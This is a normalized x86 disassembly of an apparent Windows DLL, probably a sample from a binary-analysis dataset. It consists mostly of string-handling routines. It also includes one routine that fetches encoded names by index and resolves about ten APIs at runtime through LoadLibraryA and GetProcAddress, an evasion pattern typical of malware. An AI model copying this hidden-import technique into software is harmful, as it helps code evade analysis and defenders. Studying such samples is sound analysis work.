mov [ ebp - 0x1d9c ] 0x0
cmp [ ebp - 0x1dfc ] 0x0
mov [ ebp - 0x4 ] 0x2
je r-xdata
mov edx [ ebx + 0x4 ]
push esi
lea eax [ ebp - 0x1e14 ]
push eax
lea ecx [ ebp - 0x1df8 ]
push ecx
push 0x20000013
mov [ ebp - 0x1df8 ] esi
mov [ ebp - 0x1e14 ] 0x4
mov edx [ edx + 0x18 ]
push edi
call edx
test eax eax
je r-xdata
cmp [ ebp - 0x1d88 ] 0x10
jb r-xdata
lea ecx [ esi + 0x1 ]
push ecx
call sub_10012766
mov ecx [ ebp - 0x1e1c ]
mov edx [ ebp - 0x1e10 ]
mov [ ecx ] eax
mov [ edx ] esi
mov eax [ ecx ]
add esp 0x4
cmp [ ebp - 0x1d88 ] 0x10
mov [ esi + eax ] 0x0
mov eax edi
jae r-xdata
mov [ ebp - 0x1dfc ] ecx
mov esi [ ebp - 0x1df8 ]
cmp esi ecx
je r-xdata
cmp [ ebp - 0x1df8 ] 0x197
jne r-xdata
mov esi 0x8
cmp [ ebp - 0x1da4 ] esi
jb r-xdata
push edi
call sub_10012c4b
add esp 0x4
mov ecx [ ecx ]
push esi
push eax
push ecx
call sub_10018b70
add esp 0xc
lea eax [ ebp - 0x1d9c ]
mov esi [ ebp - 0x1d8c ]
mov [ ebp - 0x1de0 ] ecx
mov [ ebp - 0x1df0 ] cl
lea eax [ ebp - 0x1d80 ]
lea ecx [ ebp - 0x1df0 ]
mov [ ebp - 0x1ddc ] 0xf
call sub_10004db0
push 0x0
lea eax [ ebp - 0x1df0 ]
push eax
or eax 0xffffffff
lea edi [ ebp - 0x1d9c ]
mov [ ebp - 0x4 ] 0x3
call sub_10002bb0
mov [ ebp - 0x4 ] 0x2
cmp [ ebp - 0x1ddc ] 0x10
jb r-xdata
mov eax [ ebp - 0x1df4 ]
dec eax
mov [ ebp - 0x1df4 ] eax
cmp eax esi
jle r-xdata
xor eax eax
mov [ ebp - 0x1da4 ] 0x7
mov [ ebp - 0x1da8 ] 0x0
mov [ ebp - 0x1db8 ] ax
cmp [ ebp - 0x1dc0 ] esi
jb r-xdata
mov edx [ ebp - 0x1db8 ]
push edx
call sub_10012c4b
add esp 0x4
cmp [ ebp - 0x1df8 ] 0x0
mov edi [ ebp - 0x1e04 ]
jbe r-xdata
mov ecx [ ebp - 0x1df0 ]
push ecx
call sub_10012c4b
add esp 0x4
mov ecx [ ebp - 0x1dc4 ]
cmp ecx esi
jbe r-xdata
mov eax ebx
mov ecx [ ebp - 0x1dd4 ]
push ecx
call sub_10012c4b
add esp 0x4
jmp r-xdata
mov ecx [ ebp - 0x1da8 ]
cmp ecx esi
jbe r-xdata
cmp [ ebp - 0x1dc0 ] 0x8
mov eax [ ebp - 0x1dd4 ]
jae r-xdata
mov edx [ ebx + 0x4 ]
mov edx [ edx + 0xc ]
lea eax [ ebp - 0x1df8 ]
push eax
push 0x1d70
lea ecx [ ebp - 0x1d80 ]
push ecx
push edi
call edx
xor ecx ecx
cmp eax ecx
je r-xdata
cmp [ ebp - 0x1da4 ] 0x8
mov eax [ ebp - 0x1db8 ]
jae r-xdata
mov edx [ ebx + 0x4 ]
push ecx
mov ecx [ edx + 0x28 ]
push eax
mov eax [ ebp - 0x1e00 ]
push 0x2b
push eax
call ecx
lea eax [ ebp - 0x1dd4 ]
mov edx [ ebx + 0x4 ]
push ecx
mov ecx [ edx + 0x28 ]
push eax
mov eax [ ebp - 0x1e00 ]
push 0x2c
push eax
call ecx
jmp r-xdata
lea eax [ ebp - 0x1db8 ]
sub_10010610
push ebp
mov ebp esp
push esi
push edi
mov edi ecx
mov ecx [ ebp + 0x8 ]
mov eax [ ecx ]
mov edx [ eax + 0x14 ]
push 0x1
call edx
mov esi eax
mov eax 0x12
call sub_10011c70
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
push ecx
push edx
push 0x0
push 0x0
push eax
push esi
push edi
xor edx edx
xor ecx ecx
call sub_10010080
push esi
mov edi eax
call sub_10012e64
add esp 0x4
mov eax edi
pop edi
pop esi
pop ebp
retn 0xc
sub_10010660
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100106c0
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ecx + 0x10 ]
cmp esi ebx
jae r-xdata
sub esi ebx
cmp eax esi
jae r-xdata
push r--data
call sub_100126f8
cmp edi ecx
jne r-xdata
mov esi eax
mov eax edi
call sub_100107f0
test al al
je r-xdata
lea ecx [ esi + ebx ]
or eax 0xffffffff
mov esi edi
call sub_10010770
mov eax ebx
xor ecx ecx
call sub_10010770
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov eax 0x8
cmp [ ecx + 0x14 ] eax
jb r-xdata
cmp [ edi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
xor edx edx
mov [ ebx + eax ] dx
mov eax [ edi ]
xor edx edx
mov [ ebx + eax ] dx
pop esi
mov eax edi
pop ebx
pop ebp
retn 0x8
mov edx [ ebp + 0xc ]
lea ebx [ esi + esi ]
push ebx
lea ecx [ ecx + edx * 2 ]
push ecx
push eax
call sub_10018b70
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] esi
jb r-xdata
sub_10010770
push edi
mov edi eax
mov eax [ esi + 0x10 ]
cmp eax ecx
jae r-xdata
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_100126f8
test edi edi
je r-xdata
mov edi eax
mov eax esi
pop edi
retn
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x8
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x8
jb r-xdata
mov ecx esi
xor edx edx
mov [ ecx + eax * 2 ] dx
mov ecx [ esi ]
xor edx edx
mov [ ecx + eax * 2 ] dx
mov eax esi
pop edi
retn
sub eax edi
add eax eax
push eax
lea eax [ ecx + edi ]
lea eax [ ebx + eax * 2 ]
push eax
lea ecx [ edx + ecx * 2 ]
push ecx
call sub_100128c0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_100107f0
cmp esi 0x7ffffffe
jbe r-xdata
mov ecx [ eax + 0x14 ]
cmp ecx esi
jae r-xdata
push r--data
call sub_100126ab
test esi esi
jne r-xdata
mov ecx [ eax + 0x10 ]
push ecx
push esi
push eax
call sub_10010840
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
xor eax eax
cmp eax esi
sbb eax eax
neg eax
retn
mov [ eax + 0x10 ] esi
cmp ecx 0x8
jb r-xdata
xor edx edx
mov [ eax ] dx
mov eax [ eax ]
sub_10010840
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c2d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x14
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov eax [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
mov esi eax
or esi 0x7
cmp esi 0x7ffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0x7ffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov ebx eax
jmp r-xdata
cmp ecx 0x7fffffff
ja r-xdata
mov esi 0x7ffffffe
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
lea ecx [ ebp - 0x20 ]
mov [ ebp - 0x14 ] 0x0
call sub_10012808
push r--data
lea eax [ ebp - 0x20 ]
push eax
mov [ ebp - 0x20 ] r--data
call sub_10013848
mov eax [ ebp + 0xc ]
lea ecx [ eax + 0x1 ]
mov [ ebp - 0x10 ] esp
mov [ ebp + 0xc ] eax
mov [ ebp - 0x4 ] 0x2
call sub_100109b0
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
add ecx ecx
push ecx
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi ] ebx
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ecx
cmp esi 0x8
jb r-xdata
mov edx [ edi ]
push edx
call sub_10012c4b
mov ecx [ ebp + 0x10 ]
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
xor edx edx
mov [ edi + ecx * 2 ] dx
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
mov edi ebx
add ecx ecx
push ecx
push eax
push ebx
call sub_10018b70
mov ecx [ ebp + 0x10 ]
add esp 0xc
sub_1001097f
mov esi [ ebp + 0x8 ]
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
push ecx
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
push ecx
mov [ esi ] cx
call sub_10013848
int3
mov eax [ esi ]
push eax
call sub_10012c4b
add esp 0x4
sub_100109b0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x7fffffff
ja r-xdata
lea ecx [ ebp - 0x4 ]
push ecx
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_10012808
push r--data
lea edx [ ebp - 0x10 ]
push edx
mov [ ebp - 0x10 ] r--data
call sub_10013848
lea eax [ ecx + ecx ]
push eax
call sub_10012ca7
add esp 0x4
test eax eax
jne r-xdata
sub_10010a10
push 0x30
call sub_10012ca7
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
xor eax eax
retn
mov [ eax ] r--data
mov [ eax + 0x18 ] 0xf
mov [ eax + 0x14 ] ecx
mov [ eax + 0x4 ] cl
mov [ eax + 0x20 ] ecx
mov [ eax + 0x24 ] ecx
mov [ eax + 0x28 ] ecx
retn
sub_10010a40
push esi
push edi
push 0xc
mov esi ecx
call sub_10012ca7
add esp 0x4
test eax eax
je r-xdata
xor edi edi
mov [ eax ] r--data
mov [ eax + 0x4 ] esi
mov [ eax + 0x8 ] 0x0
mov edi eax
jmp r-xdata
mov eax edi
pop edi
pop esi
retn
call [ GetLastError@IAT ]
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
pop edi
xor eax eax
pop esi
retn
mov esi [ edi + 0x4 ]
call sub_10010cf0
mov [ edi + 0x8 ] eax
test eax eax
jne r-xdata
sub_10010aa0
push ebp
mov ebp esp
sub esp 0x20
push ebx
push edi
mov eax 0x16
call sub_10011c70
mov edi eax
mov eax 0x17
call sub_10011c70
mov [ ebp - 0x4 ] eax
mov eax 0x18
call sub_10011c70
push edi
mov ebx eax
call [ LoadLibraryA@IAT ]
mov edi [ GetProcAddress@IAT ]
mov [ esi + 0x2c ] eax
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
call [ LoadLibraryA@IAT ]
mov [ esi + 0x30 ] eax
test eax eax
jne r-xdata
push ebx
push eax
call edi
mov [ esi + 0x4 ] eax
mov eax 0x19
call sub_10011c70
mov ebx eax
mov eax 0x1a
call sub_10011c70
mov [ ebp - 0x4 ] eax
mov eax 0x1b
call sub_10011c70
mov [ ebp - 0x8 ] eax
mov eax 0x1c
call sub_10011c70
mov [ ebp - 0xc ] eax
mov eax 0x1d
call sub_10011c70
mov [ ebp - 0x10 ] eax
mov eax 0x1e
call sub_10011c70
mov [ ebp - 0x14 ] eax
mov eax 0x1f
call sub_10011c70
mov [ ebp - 0x18 ] eax
mov eax 0x20
call sub_10011c70
mov [ ebp - 0x1c ] eax
mov eax 0x21
call sub_10011c70
mov ecx [ esi + 0x30 ]
push ebx
push ecx
mov [ ebp - 0x20 ] eax
call edi
mov edx [ ebp - 0x4 ]
mov [ esi + 0x8 ] eax
mov eax [ esi + 0x30 ]
push edx
push eax
call edi
mov ecx [ ebp - 0x8 ]
mov edx [ esi + 0x30 ]
push ecx
push edx
mov [ esi + 0xc ] eax
call edi
mov ecx [ esi + 0x30 ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0xc ]
push eax
push ecx
call edi
mov edx [ ebp - 0x10 ]
mov [ esi + 0x14 ] eax
mov eax [ esi + 0x30 ]
push edx
push eax
call edi
mov ecx [ ebp - 0x14 ]
mov edx [ esi + 0x30 ]
push ecx
push edx
mov [ esi + 0x18 ] eax
call edi
mov ecx [ esi + 0x30 ]
mov [ esi + 0x1c ] eax
mov eax [ ebp - 0x18 ]
push eax
push ecx
call edi
mov edx [ ebp - 0x1c ]
mov [ esi + 0x20 ] eax
mov eax [ esi + 0x30 ]
push edx
push eax
call edi
mov ecx [ ebp - 0x20 ]
mov edx [ esi + 0x30 ]
push ecx
push edx
mov [ esi + 0x24 ] eax
call edi
cmp [ esi + 0x8 ] 0x0
mov [ esi + 0x28 ] eax
je r-xdata
pop edi
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0xc ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x0
je r-xdata
cmp [ esi + 0x14 ] 0x0
je r-xdata
cmp [ esi + 0x18 ] 0x0
je r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x20 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
je r-xdata
xor ecx ecx
test eax eax
setne cl
pop edi
pop ebx
mov eax ecx
mov esp ebp
pop ebp
retn
sub_10010c50
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d0ab
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x8c
call sub_10012ca7
add esp 0x4
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x4 ] 0x0
test eax eax
je r-xdata
xor esi esi
mov ecx [ ebp + 0x8 ]
push ecx
push eax
call sub_10010ef0
mov esi eax
jmp r-xdata
test esi esi
je r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov [ ebp - 0x4 ] 0xffffffff
call sub_10010aa0
test eax eax
je r-xdata
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
mov edx [ esi ]
mov eax [ edx ]
push 0x1
mov ecx esi
call eax
sub_10010cf0
push ebp
mov ebp esp
sub esp 0x958
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x34 ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x34 ] 0x0
jne r-xdata
lea ecx [ ebp - 0x958 ]
push ecx
lea edx [ ebp - 0x954 ]
push edx
push 0x0
mov [ ebp - 0x958 ] 0x94d
call eax
test eax eax
jne r-xdata
mov eax [ esi + 0x34 ]
cmp [ esi + 0x48 ] 0x0
jne r-xdata
cmp [ esi + 0x48 ] eax
jne r-xdata
cmp [ esi + 0x4c ] 0x10
lea eax [ esi + 0x38 ]
jb r-xdata
mov ecx [ esi + 0x24 ]
push 0x0
push 0x0
push 0x0
push 0x4
push r--data
call ecx
mov [ esi + 0x34 ] eax
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
cmp [ esi + 0x4c ] 0x10
lea eax [ esi + 0x38 ]
jb r-xdata
mov ecx [ esi + 0x24 ]
push eax
push eax
push eax
push 0x4
lea eax [ ebp - 0x954 ]
push eax
call ecx
jmp r-xdata
mov edx [ esi + 0x24 ]
push 0x0
push 0x0
push eax
push 0x3
push r--data
call edx
mov [ esi + 0x34 ] eax
mov eax [ eax ]
push 0x0
push 0x0
push eax
mov eax [ esi + 0x24 ]
push 0x3
lea edx [ ebp - 0x954 ]
push edx
call eax
mov eax [ eax ]
mov [ esi + 0x34 ] eax
sub_10010dd0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001c2a9
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov [ ebp - 0x4 ] 0x3
mov ecx [ esi + 0x34 ]
xor ebx ebx
cmp ecx ebx
je r-xdata
mov eax [ esi + 0x2c ]
mov edi [ FreeLibrary@IAT ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x8 ]
cmp eax ebx
je r-xdata
mov eax [ esi + 0x30 ]
cmp eax ebx
je r-xdata
push eax
call edi
mov [ esi + 0x2c ] ebx
mov [ esi + 0x34 ] ebx
push ecx
call eax
cmp [ esi + 0x84 ] 0x8
jb r-xdata
push eax
call edi
mov [ esi + 0x30 ] ebx
mov edi 0x7
xor ecx ecx
mov [ esi + 0x84 ] edi
mov [ esi + 0x80 ] ebx
mov [ esi + 0x70 ] cx
cmp [ esi + 0x68 ] 0x8
jb r-xdata
mov eax [ esi + 0x70 ]
push eax
call sub_10012c4b
add esp 0x4
xor eax eax
mov [ esi + 0x68 ] edi
mov [ esi + 0x64 ] ebx
mov [ esi + 0x54 ] ax
cmp [ esi + 0x4c ] 0x10
jb r-xdata
mov edx [ esi + 0x54 ]
push edx
call sub_10012c4b
add esp 0x4
mov [ esi + 0x4c ] 0xf
mov [ esi + 0x48 ] ebx
mov [ esi + 0x38 ] bl
mov [ esi ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ esi + 0x38 ]
push ecx
call sub_10012c4b
add esp 0x4
sub_10010ec0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_10010dd0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_10010ef0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001d079
mov eax [ fs : 0x0 ]
push eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edx [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x4 ] ebx
lea ecx [ edi + 0x38 ]
mov [ edi ] r--data
mov [ ecx + 0x14 ] 0xf
mov [ ecx + 0x10 ] ebx
mov [ ecx ] bl
mov eax 0x7
xor esi esi
mov [ edi + 0x68 ] eax
mov [ edi + 0x64 ] ebx
mov [ edi + 0x54 ] si
mov [ edi + 0x84 ] eax
xor eax eax
mov [ edi + 0x80 ] ebx
mov [ edi + 0x70 ] ax
mov [ ebp - 0x4 ] 0x3
mov [ edi + 0x34 ] ebx
mov [ edi + 0x4 ] ebx
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov [ edi + 0x10 ] ebx
mov [ edi + 0x14 ] ebx
mov [ edi + 0x1c ] ebx
mov [ edi + 0x20 ] ebx
mov [ edi + 0x24 ] ebx
mov [ edi + 0x28 ] ebx
cmp edx ebx
je r-xdata
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea esi [ edx + 0x1 ]
mov al [ edx ]
inc edx
cmp al bl
jne r-xdata
mov eax [ ebp + 0xc ]
sub edx esi
mov esi edx
call sub_10004db0
sub_10010fb0
push ebp
mov ebp esp
push esi
mov esi eax
push edi
mov edi ecx
test esi esi
je r-xdata
push ebx
mov ebx [ ebp + 0x8 ]
cmp ebx 0x7ffffffe
jbe r-xdata
mov ecx [ edi + 0x14 ]
cmp ecx 0x8
jb r-xdata
mov eax [ edi + 0x14 ]
cmp eax ebx
jae r-xdata
push r--data
call sub_100126ab
mov eax edi
mov eax [ edi ]
jmp r-xdata
test ebx ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
push ecx
push ebx
push edi
call sub_10010840
test ebx ebx
je r-xdata
cmp ecx 0x8
jb r-xdata
cmp esi eax
jb r-xdata
cmp [ edi + 0x14 ] 0x8
jb r-xdata
mov [ edi + 0x10 ] ebx
cmp eax 0x8
jb r-xdata
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov eax edi
mov eax [ edi ]
jmp r-xdata
pop ebx
mov eax edi
xor edx edx
pop edi
mov [ eax ] dx
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
xor edx edx
pop ebx
mov [ eax ] dx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
cmp ecx 0x8
jb r-xdata
mov edx [ edi + 0x10 ]
lea eax [ eax + edx * 2 ]
cmp eax esi
jbe r-xdata
mov eax edi
xor ecx ecx
mov [ ebx + eax ] cx
mov eax [ edi ]
xor ecx ecx
mov [ ebx + eax ] cx
pop ebx
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
add ebx ebx
push ebx
push esi
push eax
call sub_10018b70
mov eax [ ebp + 0x8 ]
add esp 0xc
cmp [ edi + 0x14 ] 0x8
mov [ edi + 0x10 ] eax
jb r-xdata
mov eax edi
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_100106c0
pop edi
pop esi
pop ebp
retn 0x4
mov eax [ edi ]
sub esi eax
mov eax [ ebp + 0x8 ]
sar esi 0x1
push esi
push edi
call sub_100106c0
pop edi
pop esi
pop ebp
retn 0x4
sub_100110c0
push ebp
mov ebp esp
test [ ebp + 0x8 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_10012c4b
add esp 0x4
sub_100110f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cbd8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor edi edi
mov esi ecx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x2c ] 0x0
mov [ ebp - 0x4 ] edi
mov ecx [ esi + 0x24 ]
sub ecx [ esi + 0x20 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
add eax edx
mov [ ebp - 0x34 ] edi
je r-xdata
mov ecx [ ebp - 0x1c ]
inc ecx
push ecx
call sub_10012766
mov edi 0x10
add esp 0x4
mov esi eax
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] edi
jae r-xdata
mov [ ebp - 0x30 ] edi
jmp r-xdata
mov edx esi
sub edx eax
lea eax [ ebp - 0x2c ]
cmp [ ebp - 0x34 ] edi
jbe r-xdata
mov cl [ eax ]
mov [ edx + eax ] cl
inc eax
test cl cl
jne r-xdata
cmp [ ebp - 0x18 ] edi
jb r-xdata
mov eax 0x24
call sub_10011c70
mov edi eax
mov eax [ esi + 0x20 ]
add eax [ ebp - 0x30 ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
mov eax 0x23
call sub_10011c70
mov ecx eax
lea edi [ ecx + 0x1 ]
lea ecx [ ecx ]
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10012771
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x2c ]
push edx
call sub_10012c4b
add esp 0x4
mov ecx eax
lea ebx [ ecx + 0x1 ]
mov eax [ eax ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10002a60
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx ebx
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10002a60
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
mov eax edi
lea ecx [ ebp - 0x2c ]
call sub_10002a60
mov ecx [ esi + 0x20 ]
mov edx [ ebp - 0x30 ]
cmp [ ecx + edx + 0x30 ] 0x10
lea eax [ ecx + edx + 0x1c ]
jb r-xdata
mov ecx eax
lea edi [ ecx + 0x1 ]
mov eax [ eax ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx edi
push ecx
lea ecx [ ebp - 0x2c ]
call sub_10002a60
mov ecx [ esi + 0x24 ]
sub ecx [ esi + 0x20 ]
mov edi [ ebp - 0x34 ]
add [ ebp - 0x30 ] 0x38
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov eax edx
shr eax 0x1f
inc edi
add eax edx
mov [ ebp - 0x34 ] edi
cmp edi eax
jb r-xdata
xor edi edi
sub_10011280
push ebp
mov ebp esp
and esp 0xfffffff8
push 0xffffffff
push sub_1001d7d0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x48
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x40 ] eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax esp
push eax
lea eax [ esp + 0x58 ]
mov [ fs : 0x0 ] eax
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0xc ]
mov [ esp + 0x14 ] ecx
xor ebx ebx
mov ecx eax
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] ebx
mov [ esp + 0x18 ] bl
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx esi
mov esi ecx
lea ecx [ esp + 0x18 ]
call sub_10004db0
mov [ esp + 0x60 ] ebx
mov eax edi
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] ebx
mov [ esp + 0x34 ] bl
lea esi [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax esi
mov esi eax
mov eax edi
lea ecx [ esp + 0x34 ]
call sub_10004db0
mov ebx [ esp + 0x14 ]
add ebx 0x20
lea ecx [ esp + 0x18 ]
mov [ esp + 0x60 ] 0x1
call sub_100116d0
mov esi 0x10
cmp [ esp + 0x48 ] esi
jb r-xdata
xor eax eax
mov [ esp + 0x48 ] 0xf
mov [ esp + 0x44 ] eax
mov [ esp + 0x34 ] al
cmp [ esp + 0x2c ] esi
jb r-xdata
mov eax [ esp + 0x34 ]
push eax
call sub_10012c4b
add esp 0x4
mov eax 0x1
mov ecx [ esp + 0x58 ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ esp + 0x40 ]
xor ecx esp
call sub_10012771
mov esp ebp
pop ebp
retn 0x8
mov ecx [ esp + 0x18 ]
push ecx
call sub_10012c4b
add esp 0x4
sub_100113a0
cmp [ esi + 0x30 ] 0x10
jb r-xdata
mov [ esi + 0x30 ] 0xf
mov [ esi + 0x2c ] 0x0
mov [ esi + 0x1c ] 0x0
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov eax [ esi + 0x1c ]
push eax
call sub_10012c4b
add esp 0x4
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
retn
mov ecx [ esi ]
push ecx
call sub_10012c4b
add esp 0x4
sub_100113f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1001cba8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] 0x0
push 0x0
lea eax [ esi + 0x4 ]
push eax
or eax 0xffffffff
lea edi [ ebp - 0x2c ]
mov [ ebp - 0x4 ] 0x0
call sub_10002bb0
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov edx [ ebp - 0x1c ]
inc edx
push edx
call sub_10012766
mov edi 0x10
add esp 0x4
mov esi eax
mov eax [ ebp - 0x2c ]
cmp [ ebp - 0x18 ] edi
jae r-xdata
mov ecx [ esi + 0x24 ]
sub ecx [ esi + 0x20 ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x5
mov ecx edx
shr ecx 0x1f
add ecx edx
je r-xdata
mov edx esi
sub edx eax
lea eax [ ebp - 0x2c ]
mov eax 0x22
call sub_10011c70
mov ecx eax
lea edi [ ecx + 0x1 ]
lea ebx [ ebx ]
mov cl [ eax ]
